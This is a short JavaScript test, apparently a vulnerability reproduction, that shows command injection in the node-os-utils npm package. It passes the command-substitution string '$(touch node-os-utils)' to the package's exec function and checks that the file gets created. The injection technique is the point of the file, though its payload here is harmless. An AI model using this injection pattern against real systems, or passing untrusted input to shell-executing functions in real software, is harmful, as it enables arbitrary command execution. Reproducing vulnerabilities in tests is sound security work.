//https://github.com/SunilWang/node-os-utils/issues/2
test("Remote code execution in node-os-utils", () => {
  const nodeosutils = require("node-os-utils");
  const fs = require("fs");
  const path = "./node-os-utils";
  const sleep = require("sleep");
  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let command = "$(touch node-os-utils)";

  function dummySource(val) {
    command += val;
  }

  dummySource(" ");
  try {
    let exec = nodeosutils.exec;
    exec(command)();
  } catch (error) {}
  sleep.sleep(3);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
